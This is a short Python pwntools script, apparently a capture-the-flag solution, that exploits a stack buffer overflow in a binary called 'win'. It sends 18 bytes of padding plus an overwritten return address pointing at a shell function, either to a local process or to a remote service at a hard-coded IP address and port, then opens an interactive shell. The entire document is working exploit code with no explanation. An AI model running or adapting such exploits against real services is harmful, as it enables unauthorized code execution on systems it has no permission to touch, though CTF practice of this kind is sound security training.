from pwn import *

def exploit(boolean):
    if(boolean):
        r = remote('173.255.201.51', 3337)
    else:
        r = process('./win')
    
    shell_addr = 0x401157
    payload = b'A' * 18
    payload += p64(shell_addr)
    # payload += b'\x78\x11\x40\x00\x00\x00\x00\x00'
    r.recvuntil('Can u find me ? i dont think so...!')
    # r.recvline()
    r.sendline(payload)
    r.interactive()

exploit(True)